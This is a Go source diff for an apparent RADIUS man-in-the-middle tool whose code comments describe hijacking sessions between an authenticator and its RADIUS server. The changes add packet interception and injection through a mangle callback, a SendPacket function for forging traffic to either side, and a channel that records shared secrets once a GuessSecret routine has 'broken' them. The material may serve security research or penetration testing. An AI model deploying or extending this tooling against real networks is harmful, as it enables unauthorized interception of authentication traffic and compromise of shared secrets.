@@ -1,7 +1,6 @@
 package session
 
 import (
-	"encoding/hex"
 	"fmt"
 	"net"
 	"radius/radius"
@@ -19,13 +18,23 @@ const (
 //MangleFunc Callback that receives as argument the intercepted packetm, the client and server addresses and the sense of the packet (client -> server, server -> client)
 type MangleFunc func(packet *radius.RadiusPacket, from net.UDPAddr, to net.UDPAddr, clientToServer bool) bool
 
+//This struct is used as payload for the secretChan channel used to transmit
+//the pair secret-client from the goroutine to the main routine when the secret is discovered for such client
+type secretClientPair struct {
+	clientAddr net.UDPAddr
+	secret     string
+}
+
 //Session between host and guest to be hijacked.
 //The attacker must be placed between the authenticator and the authenticator server.
 //hostName is the target RADIUS authenticator
 type Session struct {
-	hostName string //Target RADIUS server
-	ports    []int  //Target ports
-	mode     Mode
+	hostName          string //Target RADIUS server
+	ports             []int  //Target ports
+	currentClientData *clientData
+	currentServerConn *net.UDPConn
+	secretChan        chan secretClientPair
+	mode              Mode
 }
 
 type udpData struct {
@@ -102,12 +111,17 @@ func (session *Session) Init(mode Mode, hostName string, ports ...int) {
 
 	copy(session.ports, ports)
 
+	//Initialize the TLS local server
+	initLocalTLSServer()
+
 }
 
-//HijackSession In order to spy the communications between authenticator and authenticator server
+//Hijack In order to spy the communications between authenticator and authenticator server
 func (session *Session) Hijack(mangleFunc MangleFunc) {
 
 	var clients []clientData
+
+	session.secretChan = make(chan secretClientPair)
 
 	udpChan := make(chan udpData)
 	serverConnections := make(map[int]*net.UDPConn)
@@ -122,164 +136,213 @@ func (session *Session) Hijack(mangleFunc MangleFunc) {
 
 	for {
 
+		select {
 		//Packet received
-		data, more := <-udpChan
+		case data, more := <-udpChan:
 
-		//Channel closed (Problems with one of the sides)
-		if !more {
-			fmt.Println("Something went wrong...")
-			break
-		}
+			//Channel closed (Problems with one of the sides)
+			if !more {
+				fmt.Println("Hijack: Something went wrong...")
+				break
+			}
 
-		fmt.Println("Message from", data.senderAddr, "to port:", data.dstPort)
+			fmt.Println("Message from", data.senderAddr, "to port:", data.dstPort)
 
-		fmt.Println(hex.Dump(data.buff))
+			//fmt.Println(hex.Dump(data.buff))
 
-		//Forward packet
+			//Forward packet
 
-		if data.senderAddr.IP.Equal(net.ParseIP(
-			session.hostName)) && utils.Contains(session.ports, data.senderAddr.Port) { //Came from authenticator server RADIUS
+			if data.senderAddr.IP.Equal(net.ParseIP(
+				session.hostName)) && utils.Contains(session.ports, data.senderAddr.Port) { //Came from authenticator server RADIUS
 
-			fmt.Println("From authenticator server")
+				fmt.Println("From authenticator server")
 
-			//Check if address already seen
-			for _, client := range clients {
-				if client.mappedPort == data.dstPort {
-					fmt.Println("Send to client", client.clientAddr)
+				//Check if address already seen
+				for _, client := range clients {
+					if client.mappedPort == data.dstPort {
+						fmt.Println("Send to client", client.clientAddr)
 
-					if session.mode == Active {
+						if session.mode == Active {
 
-						packet := radius.NewRadiusPacket()
+							session.currentClientData = &client
+							session.currentServerConn = serverConnections[data.senderAddr.Port]
 
-						packet.Decode(data.buff)
+							packet := radius.NewRadiusPacket()
 
-						forward := mangleFunc(packet, data.senderAddr, client.clientAddr, false)
+							packet.Decode(data.buff)
 
-						if forward {
+							forward := mangleFunc(packet, data.senderAddr, client.clientAddr, false)
 
-							if encoded, raw := packet.Encode(); encoded {
-								fmt.Println("Forwarded... ")
-								//Redirect our custom mangled packet to the client
-								serverConnections[data.senderAddr.Port].WriteToUDP(raw, &client.clientAddr)
+							if forward {
+
+								if encoded, raw := packet.Encode(); encoded {
+									fmt.Println("Forwarded... ")
+									//Redirect our custom mangled packet to the client
+									serverConnections[data.senderAddr.Port].WriteToUDP(raw, &client.clientAddr)
+								}
+
 							}
 
+						} else {
+							//Redirect to client without any treatment
+							serverConnections[data.senderAddr.Port].WriteToUDP(data.buff, &client.clientAddr)
+
 						}
 
-					} else {
-						//Redirect to client without any treatment
-						serverConnections[data.senderAddr.Port].WriteToUDP(data.buff, &client.clientAddr)
-
+						break
 					}
-
-					break
 				}
-			}
 
-		} else { //From authenticator
+			} else { //From authenticator
 
-			fmt.Println("From authenticator ")
+				fmt.Println("From authenticator ")
 
-			found := false
+				found := false
 
-			var client clientData
+				var client clientData
 
-			//Check if address already seen
-			for _, client = range clients {
-				if client.clientAddr.IP.Equal(data.senderAddr.IP) && client.clientAddr.Port == data.senderAddr.Port {
-					fmt.Println("Client found.")
-					found = true
-					break
+				//Check if address already seen
+				for _, client = range clients {
+					if client.clientAddr.IP.Equal(data.senderAddr.IP) && client.clientAddr.Port == data.senderAddr.Port {
+						fmt.Println("Client found.")
+						found = true
+						break
+					}
 				}
-			}
 
-			if !found {
-				//Create client
+				if !found {
+					//Create client
 
-				fmt.Println("Client not found. Creating... ")
+					fmt.Println("Client not found. Creating... ")
 
-				//Determine free port
+					//Determine free port
 
-				freePort := false
-				mappedPort := data.senderAddr.Port //First we try with the sender's port
+					freePort := false
+					mappedPort := data.senderAddr.Port //First we try with the sender's port
 
-				for !freePort {
-					freePort = true
-					for _, client := range clients {
-						if client.mappedPort == mappedPort {
-							freePort = false
-							mappedPort++ //Try next port
-							break
+					for !freePort {
+						freePort = true
+						for _, client := range clients {
+							if client.mappedPort == mappedPort {
+								freePort = false
+								mappedPort++ //Try next port
+								break
+							}
 						}
+
 					}
 
+					localAddr := net.UDPAddr{
+						//IP: net.IPv4(0, 0, 0, 0)
+						Port: mappedPort,
+					}
+
+					authAddr, err := net.ResolveUDPAddr(protocol, session.hostName+":"+strconv.FormatUint(uint64(data.dstPort), 10))
+
+					if err != nil {
+						fmt.Println("Error authAddr ", err)
+						return
+					}
+
+					conn, err := net.DialUDP(protocol, &localAddr, authAddr)
+
+					if err != nil {
+						fmt.Println("Error net.DialUDP ", err)
+						return
+					}
+
+					client = clientData{
+						clientAddr: data.senderAddr,
+						connection: conn,
+						mappedPort: mappedPort,
+					}
+
+					clients = append(clients, client)
+
+					//Create new context for the new session. Available for the whole program.
+
+					AddContext(client.clientAddr, *(client.connection.RemoteAddr().(*net.UDPAddr)))
+
+					go receiveUDPPacket(client.connection, mappedPort, udpChan) //Start receiving packets from radius server
+
 				}
 
-				localAddr := net.UDPAddr{
-					//IP: net.IPv4(0, 0, 0, 0)
-					Port: mappedPort,
+				fmt.Println("Sending to Radius Server...", client.connection.RemoteAddr().String())
+
+				if session.mode == Active {
+
+					session.currentClientData = &client
+					session.currentServerConn = serverConnections[client.connection.RemoteAddr().(*net.UDPAddr).Port]
+
+					packet := radius.NewRadiusPacket()
+
+					packet.Decode(data.buff)
+
+					forward := mangleFunc(packet, client.clientAddr, *(client.connection.RemoteAddr().(*net.UDPAddr)), true)
+
+					if forward {
+
+						if encoded, raw := packet.Encode(); encoded {
+							fmt.Println("Forwarded... ")
+							client.connection.Write(raw) //Redirect mangled packet to server
+						}
+
+					}
+
+				} else {
+					//Redirect raw data without any treatment
+					client.connection.Write(data.buff)
 				}
-
-				authAddr, err := net.ResolveUDPAddr(protocol, session.hostName+":"+strconv.FormatUint(uint64(data.dstPort), 10))
-
-				if err != nil {
-					fmt.Println("Error authAddr ", err)
-					return
-				}
-
-				conn, err := net.DialUDP(protocol, &localAddr, authAddr)
-
-				if err != nil {
-					fmt.Println("Error net.DialUDP ", err)
-					return
-				}
-
-				client = clientData{
-					clientAddr: data.senderAddr,
-					connection: conn,
-					mappedPort: mappedPort,
-				}
-
-				clients = append(clients, client)
-
-				//Create new context for the new session. Available for the whole program.
-
-				context := ContextInfo{
-					server: *(client.connection.RemoteAddr().(*net.UDPAddr)),
-					nas:    client.clientAddr,
-				}
-
-				AddContext(&context)
-
-				go receiveUDPPacket(client.connection, mappedPort, udpChan) //Start receiving packets from radius server
 
 			}
 
-			fmt.Println("Sending to Radius Server...", client.connection.RemoteAddr().String())
+		case secretClient := <-session.secretChan:
 
-			if session.mode == Active {
+			//Secret for a client has been broken.
+			//Add it to the context
+			context := GetContextByClient(secretClient.clientAddr)
 
-				packet := radius.NewRadiusPacket()
-
-				packet.Decode(data.buff)
-
-				forward := mangleFunc(packet, client.clientAddr, *(client.connection.RemoteAddr().(*net.UDPAddr)), true)
-
-				if forward {
-
-					if encoded, raw := packet.Encode(); encoded {
-						fmt.Println("Forwarded... ")
-						client.connection.Write(raw) //Redirect mangled packet to server
-					}
-
-				}
-
-			} else {
-				//Redirect raw data without any treatment
-				client.connection.Write(data.buff)
-			}
+			context.SetSecret(secretClient.secret)
+			context.SetSecretStatus(SecretOk)
 
 		}
 
+	}
+
+}
+
+//SendPacket must be only called from manglePacket
+func (session *Session) SendPacket(packet *radius.RadiusPacket, clientToServer bool) {
+
+	if encoded, raw := packet.Encode(); encoded {
+		fmt.Println("Session send packet... ")
+
+		if clientToServer {
+			fmt.Println("Send packet to server... ")
+			num, err := session.currentClientData.connection.Write(raw) //Send packet to server
+
+			if err != nil {
+				fmt.Println("Error:", err)
+			} else {
+				fmt.Println("Bytes written:", num)
+			}
+
+		} else {
+			session.currentServerConn.WriteToUDP(raw, &session.currentClientData.clientAddr)
+			fmt.Println("Send packet to client... ")
+		}
+
+	}
+
+}
+
+func (session *Session) GuessSecret(packet *radius.RadiusPacket, client net.UDPAddr, server net.UDPAddr, clientToServer bool) {
+
+	context := GetContextByClient(client)
+
+	//Only guess secret if it has not yet discovered or if there is no a discovering process
+	if context.GetSecretStatus() != SecretOk {
+		GuessSecret(packet, client, server, clientToServer, session.secretChan)
 	}
 
 }
